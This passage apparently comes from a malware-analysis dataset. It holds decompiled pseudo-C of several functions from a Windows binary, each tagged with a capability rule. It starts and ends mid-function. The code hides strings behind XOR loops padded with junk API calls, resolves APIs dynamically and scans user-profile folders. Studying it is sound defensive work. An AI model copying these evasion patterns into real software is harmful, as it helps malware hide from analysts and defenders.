{\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar3 != 0x2501ed) {\n            *(iVar7 + iVar6) = *(&var_40h + iVar7 % var_8h) ^ (iVar7 + iVar6)[&var_30h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_18h._0_1_ = 0x6d;\n    var_50h = 0x5;\n    var_18h._1_1_ = 5;\n    var_18h._2_1_ = 0x78;\n    var_18h._3_1_ = 9;\n    var_14h = 0x2307;\n    var_12h._0_2_ = 0x67;\n    var_12h._2_2_ = 0x1a58;\n    var_eh._0_2_ = 0x3e07;\n    var_eh._2_2_ = 0x7244;\n    var_2ch = 0x79377237;\n    var_28h._0_2_ = 0x4d62;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xf);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar7 = 0;\n    var_40h = iVar6;\n    var_24h = &var_18h - iVar6;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n        iVar3 = lpLibFileName;\n        if (iVar4 != 0xfb6cb0) {\n            *(iVar7 + iVar6) = *(&var_2ch + iVar7 % var_8h) ^ (iVar7 + iVar6)[&var_18h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xe);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    var_7ch = 0x18;\n    var_78h = 0;\n    var_70h = 0;\n    var_74h = 0;\n    var_6ch = 0;\n    var_68h = 0;\n    iVar7 = (*pcVar5)(&var_54h, 0x400, &var_7ch, &var_64h);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (-1 < iVar7) {\n        var_1ch = 0x12090015;\n        var_18h._0_1_ = 9;\n        var_18h._1_1_ = 0x21;\n        var_18h._2_1_ = 0x1f;\n        var_18h._3_1_ = 5;\n        var_14h = 0x129;\n        var_12h._0_2_ = 0x3c09;\n        var_12h._2_2_ = 0x233c;\n        var_eh._0_2_ = 0x929;\n        var_eh._2_2_ = 0x2109;\n        var_ah = 0x4f;\n        var_38h = 0x6246774f;\n        var_34h._0_2_ = 0x4f6c;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar7 = 0;\n        var_2ch = iVar6;\n        var_24h = &var_1ch - iVar6;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_DestroyCaret)();\n            iVar3 = lpLibFileName;\n            if (iVar4 != 0xcf7988) {\n                *(iVar7 + iVar6) = *(&var_38h + iVar7 % var_8h) ^ (iVar7 + iVar6)[&var_1ch - iVar6];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x13);\n        uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n        pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        iVar7 = (*pcVar5)(var_54h, 8, &hObject);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (-1 < iVar7) {\n            var_20h = 0x1f1f1b1c;\n            var_1ch = 0x7153429;\n            var_18h._0_1_ = 4;\n            var_18h._1_1_ = 0x2a;\n            var_18h._2_1_ = 0x29;\n            var_18h._3_1_ = 0x1e;\n            var_14h = 0xb23;\n            var_12h._0_2_ = 0x2f38;\n            var_12h._2_2_ = 0x2003;\n            var_eh._0_2_ = 0x233e;\n            var_eh._2_2_ = 0x92d;\n            var_ah = 0x20;\n            uStack13 = 0x6a;\n            var_8h = 0x6a4e6c46;\n            var_4h._0_1_ = 0x4c;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n            iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar7 = 0;\n            var_38h = iVar6;\n            var_24h = &var_20h - iVar6;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n                iVar3 = lpLibFileName;\n                if (iVar4 != 0xb0bd8f) {\n                    *(iVar7 + iVar6) = *(&var_8h + iVar7 % var_50h) ^ (iVar7 + iVar6)[&var_20h - iVar6];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x18);\n            uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n            var_50h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n            (*var_50h)(hObject, 1, 0, 0, &dwBytes);\n            pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, dwBytes);\n            var_8h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (var_8h != NULL) {\n                iVar7 = (*var_50h)(hObject, 1, var_8h, dwBytes, &dwBytes);\n                if (-1 < iVar7) {\n                    puVar8 = *var_8h;\n                    puVar10 = var_5ch;\n                    for (iVar6 = 0x1c; iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar10 = *puVar8;\n                        puVar8 = puVar8 + 1;\n                        puVar10 = puVar10 + 1;\n                    }\n                    var_58h = 1;\n                    iVar6 = var_38h;\n                    iVar3 = lpLibFileName;\n                }\n                uVar2 = (*pcVar5)(0, var_8h);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            uVar2 = (*pcVar5)(0, iVar6);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            iVar6 = var_2ch;\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_54h);\n        uVar2 = (*pcVar5)(0, iVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        iVar6 = var_40h;\n    }\n    uVar2 = (*pcVar5)(0, iVar6);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar5)(0, iVar3);\n    (*pcVar1)(uVar2);\n    return var_58h;\n}\n",
        "token_count": 2607
    },
    "0040e3c1": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040e3c1(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    uchar *puVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint *puVar12;\n    uint32_t uVar13;\n    code *pcVar14;\n    int16_t *piVar15;\n    uint lpFindFileData;\n    uint lpString1;\n    uint *lpMem;\n    int32_t var_d4h;\n    int32_t var_d0h;\n    int32_t var_cch;\n    uint var_c8h;\n    int32_t lpString2;\n    uint var_c0h;\n    uint var_bbh;\n    uint var_b7h;\n    uint var_b3h;\n    uint var_afh;\n    uint var_abh;\n    uint var_a7h;\n    uint var_a3h;\n    uint var_9fh;\n    uchar var_9bh;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    int32_t hFindFile;\n    uchar *ARG_0;\n    int16_t *var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    uchar *lpFileName;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_dh;\n    uint32_t var_9h;\n    int32_t dwBytes;\n    \n    pcVar2 = _sym.imp.USERENV.dll_GetProfilesDirectoryW;\n    var_c8h = 0;\n    ARG_0 = NULL;\n    dwBytes = 0;\n    (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(0, &dwBytes);\n    pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (dwBytes != 0) {\n        dwBytes = dwBytes + 10;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, dwBytes * 2);\n        piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        var_60h = piVar4;\n        uVar3 = (*pcVar14)(8, dwBytes * 2);\n        lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        if (piVar4 != NULL) {\n            uVar3 = (*pcVar14)(8, 0x208);\n            puVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            puVar6 = &lpFindFileData;\n            ARG_0 = puVar5;\n            for (iVar10 = 0x250; piVar4 = var_60h,  iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            for (iVar10 = 0x208; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            puVar5 = lpFileName;\n            for (iVar10 = dwBytes * 2; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            piVar15 = var_60h;\n            for (iVar10 = dwBytes * 2; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *piVar15 = 0;\n                piVar15 = piVar15 + 1;\n            }\n            iVar10 = (*pcVar2)(var_60h, &dwBytes);\n            if (iVar10 != 0) {\n                iVar10 = lpFileName - piVar4;\n                do {\n                    iVar1 = *piVar4;\n                    *(piVar4 + iVar10) = iVar1;\n                    piVar4 = piVar4 + 1;\n                } while (iVar1 != 0);\n                var_58h = 0x61525a14;\n                var_54h = 0x78704874;\n                var_50h._0_2_ = 0x5a61;\n                var_44h = 0x61785a48;\n                var_40h._0_1_ = 0x5a;\n                uVar3 = (*pcVar14)(8, 0x15);\n                puVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                var_48h = 5;\n                iVar10 = 0;\n                lpMem = puVar6;\n                do {\n                    iVar7 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n                    if (iVar7 != 0xd9692e) {\n                        *(iVar10 + puVar6) = *(&var_44h + iVar10 % var_48h) ^ (iVar10 + puVar6)[&var_58h - puVar6];\n                    }\n                    pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    iVar10 = iVar10 + 1;\n                    puVar12 = puVar6;\n                } while (iVar10 < 10);\n                do {\n                    iVar1 = *puVar12;\n                    puVar12 = puVar12 + 2;\n                } while (iVar1 != 0);\n                uVar13 = puVar12 - puVar6;\n                puVar12 = lpFileName + -2;\n                do {\n                    piVar4 = puVar12 + 2;\n                    puVar12 = puVar12 + 2;\n                } while (*piVar4 != 0);\n                for (uVar11 = uVar13 >> 2; uVar11 != 0; uVar11 = uVar11 - 1) {\n                    *puVar12 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                    puVar12 = puVar12 + 1;\n                }\n                for (uVar13 = uVar13 & 3; uVar13 != 0; uVar13 = uVar13 - 1) {\n                    *puVar12 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                    puVar12 = puVar12 + 1;\n                }\n                hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n                if (hFindFile != -1) {\n                    var_5ch = 0x795a535b;\n                    var_70h = 0x795a5375;\n                    var_6ch._0_1_ = 0x67;\n                    var_90h = 0x4d604a7e;\n                    var_8ch._0_2_ = 0x5035;\n                    var_78h = 0x4d4e4a50;\n                    var_74h._0_1_ = 0x35;\n                    var_cch = 6;\n                    do {\n                        iVar7 = 0;\n                        uVar3 = (*pcVar14)(8, 9);\n                        iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                        lpString2 = iVar10;\n                        var_3ch = &var_5ch - iVar10;\n                        do {\n                            iVar8 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n                            if (iVar8 != 0xa52867) {\n                                *(iVar7 + iVar10) = *(&var_70h + iVar7 % var_48h) ^ (iVar7 + iVar10)[&var_5ch - iVar10];\n                            }\n                            iVar7 = iVar7 + 1;\n                        } while (iVar7 < 4);\n                        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n                        iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                        iVar7 = 0;\n                        var_44h = iVar10;\n                        var_3ch = &var_90h - iVar10;\n                        do {\n                            iVar9 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n                            iVar8 = lpString2;\n                            if (iVar9 != 0x2eceb6) {\n                                *(iVar7 + iVar10) = *(&var_78h + iVar7 % var_48h) ^ (iVar7 + iVar10)[&var_90h - iVar10];\n                            }\n                            iVar7 = iVar7 + 1;\n                        } while (iVar7 < 6);\n                        iVar7 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, lpString2);\n                        pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        if (((iVar7 != 0) &&\n                            (iVar7 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, iVar10),  iVar7 != 0)) &&\n                           ((lpFindFileData & 0x10) != 0)) {\n                            var_30h = 0x501b4e1d;\n                            var_2ch = 0x4e304a3a;\n                            var_28h = 0x4a795018;\n                            var_24h = 0x50114e02;\n                            var_20h = 0x4e254a2d;\n                            var_1ch = 0x4a37501d;\n                            var_18h = 0x50074e36;\n                            var_14h._0_1_ = 5;\n                            var_14h._1_1_ = 0x4a;\n                            stack0xffffffeb = 0x3450114e;\n                            var_dh = 0x744e214a;\n                            var_9h._0_1_ = 0x50;\n                            var_98h = 0x50744e51;\n                            var_94h._0_2_ = 0x4a59;\n                            var_14h._2_1_ = var_14h;\n                            uVar3 = (*pcVar14)(8, 0x51);\n                            iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                            iVar7 = 0;\n                            var_3ch = iVar10;\n                            unique0x100005fe = &var_30h - iVar10;\n                            do {\n                                iVar8 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n                                if (iVar8 != 0x3ffd08) {\n                                    *(iVar7 + iVar10) =\n                                         *(&var_98h + iVar7 % var_cch) ^ (iVar7 + iVar10)[&var_30h - iVar10];\n                                }\n                                pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                iVar7 = iVar7 + 1;\n                            } while (iVar7 < 0x28);\n                            var_c0h._0_1_ = 5;\n                            stack0xffffff3d = 0x246c4165;\n                            var_bbh = 0xd312144;\n                            var_b7h = 0x50653054;\n                            var_b3h = 0x2944086c;\n                            var_afh = 0x27540331;\n                            var_abh = 0x386c5065;\n                            var_a7h = 0x38313944;\n                            var_a3h = 0x5c652154;\n                            var_9fh = 0x6544246c;\n                            var_9bh = 0x31;\n                            var_80h = 0x6c316544;\n                            var_7ch._0_1_ = 0x54;\n                            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x4d);\n                            iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                            iVar7 = 0;\n                            *NULL = &var_c0h - iVar10;\n                            var_d4h = iVar10;\n                            do {\n                                iVar8 = (*pcVar14)();\n                                if (iVar8 != 0xae2717) {\n                                    *(iVar7 + iVar10) =\n                                         *(&var_80h + iVar7 % var_48h) ^ (iVar7 + iVar10)[stack0xfffffff4];\n                                }\n                                iVar7 = iVar7 + 1;\n                            } while (iVar7 < 0x26);\n                            var_54h = var_3ch;\n                            stack0xfffffff4 = 0;\n                            var_88h = 0x42516364;\n                            var_84h._0_1_ = 0x4d;\n                            var_58h = iVar10;\n                            do {\n                                var_38h = 0x42226341;\n                                var_34h = 0x51466411;\n                                var_30h = 0x63384d31;\n                                var_2ch = 0x643e4274;\n                                var_28h = 0x4d37513f;\n                                var_24h = 0x423b6315;\n                                var_20h = 0x5108642e;\n                                var_1ch = 0x63034d27;\n                                var_18h = 0x64254224;\n                                var_14h._0_1_ = 0xf;\n                                var_14h._1_1_ = 0x51;\n                                var_14h._2_1_ = 0x6c;\n                                stack0xffffffeb = 0x3c63104d;\n                                var_dh = 0x63643d42;\n                                var_9h._0_1_ = 0x51;\n                                uVar3 = (*pcVar14)(8, 0x61);\n                                iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                                iVar7 = 0;\n                                var_d0h = &var_38h - iVar10;\n                                do {\n                                    iVar8 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n                                    puVar5 = ARG_0;\n                                    if (iVar8 != 0xaecdaa) {\n                                        *(iVar7 + iVar10) =\n                                             *(&var_88h + iVar7 % var_48h) ^ (iVar7 + iVar10)[&var_38h - iVar10];\n                                    }\n                                    iVar7 = iVar7 + 1;\n                                } while (iVar7 < 0x30);\n                                (*_sym.imp.USER32.dll_wsprintfW)\n                                          (ARG_0, iVar10, var_60h, &lpString1, (&var_58h)[stack0xfffffff4]);\n                                iVar7 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(puVar5);\n                                pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                if (iVar7 != -1) {\n                                    fcn.0040cb6d();\n                                    var_c8h = 1;\n                                }\n                                uVar3 = (*pcVar14)(0, iVar10);\n                                pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                                *NULL = stack0xfffffff4 + 1;\n                            } while (*NULL < 2);\n                            uVar3 = (*pcVar14)(0, var_d4h);\n                            (*pcVar2)(uVar3);\n                            uVar3 = (*pcVar14)(0, var_3ch);\n                            (*pcVar2)(uVar3);\n                            iVar10 = var_44h;\n                            iVar8 = lpString2;\n                        }\n                        uVar3 = (*pcVar14)(0, iVar10);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                        uVar3 = (*pcVar14)(0, iVar8);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                        iVar10 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, &lpFindFileData);\n                    } while (iVar10 != 0);\n                }\n                (*_sym.imp.KERNEL32.dll_FindClose)(hFindFile);\n                uVar3 = (*pcVar14)(0, lpMem);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                piVar4 = var_60h;\n            }\n        }\n        if (lpFileName != NULL) {\n            uVar3 = (*pcVar14)(0, lpFileName);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        if (piVar4 != NULL) {\n            uVar3 = (*pcVar14)(0, piVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        if (ARG_0 != NULL) {\n            uVar3 = (*pcVar14)(0, ARG_0);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n    }\n    return var_c8h;\n}\n",
        "token_count": 3961
    },
    "0040ea5a": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040ea5a(void)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t lpModuleName;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    puVar9 = &var_24h;\n    for (iVar7 = 8; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_30h = 0xf0e380d;\n    var_2ch = 0x20071c21;\n    var_4h = 6;\n    var_28h = var_28h & 0xffff0000 | 0x6306;\n    var_1ch = 0x636a4c63;\n    var_18h._0_2_ = 0x324d;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    lpModuleName = iVar7;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar4 != 0x2501ed) {\n            *(iVar8 + iVar7) = *(&var_1ch + iVar8 % var_4h) ^ (iVar8 + iVar7)[&var_30h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 10);\n    var_34h = 0x14381d17;\n    var_30h = 0x1c353f35;\n    var_2ch = 0x20193220;\n    var_28h = 0x57665a26;\n    var_1ch = 0x57546945;\n    var_18h._0_2_ = 0x525a;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_ch = &var_34h - iVar7;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n        iVar4 = lpModuleName;\n        if (iVar5 != 0xccb859) {\n            *(iVar8 + iVar7) = *(&var_1ch + iVar8 % var_4h) ^ (iVar8 + iVar7)[&var_34h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x10);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar7);\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    cVar2 = fcn.0040d3fa();\n    if (cVar2 != '\\0') {\n        var_8h = (*pcVar6)(0, var_20h, var_24h);\n    }\n    fcn.0040cd6f();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar1)(0, iVar4);\n    (*pcVar6)(uVar3);\n    return var_8h;\n}\n",
        "token_count": 957
    },
    "0040ef6d": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040ef6d(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_ch = 0;\n    var_4h = *0x41dd6c;\n    fcn.004017d6();\n    uVar2 = fcn.004017d6();\n    iVar3 = fcn.0040ebb1(uVar2 & 0xff, 0x41dd6c, 0x41dd70, &var_8h);\n    if (iVar3 != 0) {\n        iVar3 = fcn.0040ebb1(0, 0x41dd6c, 0x41dd74, &var_8h);\n        if (iVar3 != 0) {\n            var_24h = 0x48077042;\n            var_20h = 0x62156c39;\n            var_1ch._0_2_ = 0x4148;\n            var_18h = 0x4862706c;\n            var_14h._0_1_ = 0x41;\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n                if (iVar5 != 0x5c2604) {\n                    var_10h = 5;\n                    *(iVar6 + iVar3) = *(&var_18h + iVar6 % 5) ^ (iVar6 + iVar3)[&var_24h - iVar3];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 10);\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(*0x41dd74, iVar3);\n            iVar6 = fcn.0040ebb1(0, 0x41dd6c, 0x41dd84, &var_8h);\n            pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (iVar6 != 0) {\n                var_4h = var_4h ^ 0x29787279;\n                var_4h = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                iVar6 = fcn.0040ebb1(0, &var_4h, 0x41dd78, &var_8h);\n                if (iVar6 != 0) {\n                    var_ch = 1;\n                }\n            }\n            uVar4 = (*pcVar1)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 711
    },
    "0040f0c2": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040f0c2(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int16_t *piVar9;\n    uchar *puVar10;\n    int32_t iVar11;\n    uint uStack1428;\n    uchar *puStack1424;\n    uchar *puStack1420;\n    uint uStack1416;\n    uint uStack1412;\n    uint uStack1408;\n    code *pcStack1404;\n    int32_t iStack1400;\n    uchar *puStack1396;\n    uint uStack1392;\n    uint uStack1388;\n    uint uStack1384;\n    uchar *puStack1380;\n    uchar *puStack1376;\n    uint uStack1372;\n    uint uStack1368;\n    int32_t iStack1364;\n    uint uStack1360;\n    uint uStack1356;\n    uint uStack1352;\n    uint uStack1348;\n    uint uStack1344;\n    int32_t iStack1340;\n    uint uStack1324;\n    uint uStack1320;\n    uint uStack1316;\n    int32_t iStack1312;\n    uint uStack1308;\n    uint uStack1304;\n    uchar uStack1300;\n    uint uStack1292;\n    uint uStack1288;\n    int32_t iStack1284;\n    uchar *puStack1280;\n    int32_t iStack1276;\n    int32_t iStack1272;\n    uint uStack1268;\n    uint uStack1264;\n    uint uStack1260;\n    uint uStack1256;\n    uint uStack1252;\n    uint uStack1248;\n    uint uStack1244;\n    uint uStack1240;\n    uint uStack1236;\n    uchar *puStack1232;\n    uint uStack1228;\n    uint uStack1224;\n    uint uStack1220;\n    uint uStack1216;\n    uint uStack1212;\n    uchar *puStack1208;\n    uint uStack1204;\n    ushort uStack1200;\n    uint32_t uStack1196;\n    int32_t iStack1192;\n    uint uStack1172;\n    uint uStack1168;\n    uchar auStack1160 [4];\n    int32_t iStack1156;\n    uchar auStack1148 [8];\n    uint uStack1140;\n    int16_t iStack1136;\n    uchar auStack1134 [22];\n    uchar auStack1112 [4];\n    uchar auStack1108 [40];\n    uchar auStack1068 [36];\n    uchar auStack1032 [1028];\n    \n    uStack1140 = 0x200;\n    iStack1312 = 0x2a18513a;\n    puVar10 = &stack0xfffffbf8;\n    for (iVar8 = 0x400; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    uStack1308 = 0x58073d54;\n    puVar10 = &stack0xfffffb90;\n    for (iVar8 = 0x40; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    iStack1340 = 0xe;\n    uStack1304 = 0x583d556a;\n    puVar10 = &stack0xfffffbd4;\n    for (iVar8 = 0x24; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    uStack1344 = 8;\n    uStack1300 = 0x6a;\n    uStack1320 = 0x446a3451;\n    uStack1316 = CONCAT31(uStack1316._1_3_, 0x31);\n    uStack1348 = 0x40f13a;\n    uStack1348 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    uStack1352 = 0x40f141;\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    iStack1272 = 5;\n    iStack1276 = 0;\n    iVar11 = 0;\n    iStack1156 = iVar8;\n    do {\n        uStack1352 = 0x40f168;\n        iVar4 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n        if (iVar4 != 0x3644e2) {\n            *(iVar11 + iVar8) = (&stack0xfffffacc)[iVar11 % iStack1272] ^ (iVar11 + iVar8)[&stack0xfffffad4 + -iVar8];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0xd);\n    uStack1352 = 0x15;\n    uStack1356 = 8;\n    uStack1324 = 0x78450f09;\n    uStack1320 = 0x47033a29;\n    uStack1316 = 0x19371b53;\n    iStack1312 = 0x7255345;\n    uStack1308 = 0x48595704;\n    uStack1360 = 0x40f1c9;\n    uStack1360 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    iStack1364 = 0x40f1d0;\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    iVar11 = 0;\n    puStack1280 = &stack0xfffffac8 + -iVar8;\n    iStack1276 = iVar8;\n    do {\n        iStack1364 = 0x40f1ec;\n        iVar4 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar4 != 0x7939fd) {\n            *(iVar11 + iVar8) = (&stack0xfffffac0)[iVar11 % iStack1284] ^ (iVar11 + iVar8)[&stack0xfffffac8 + -iVar8];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x14);\n    uStack1368 = uStack1168;\n    uStack1372 = 0x40f21b;\n    iStack1364 = 